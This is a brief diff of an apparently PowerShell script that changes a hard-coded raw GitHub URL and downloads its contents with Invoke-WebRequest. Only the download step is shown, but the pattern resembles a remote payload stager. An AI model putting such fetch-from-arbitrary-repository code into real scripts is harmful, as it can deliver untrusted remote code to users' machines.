@@ -1,6 +1,6 @@
 
 
-$url = "https://raw.githubusercontent.com/HeadShotXx/asjdhx-aosx-asj1/main/fuhrer.txt"
+$url = "https://raw.githubusercontent.com/prowben/b/main/deneme.txt"
 
 $response = Invoke-WebRequest -Uri $url -UseBasicParsing
 
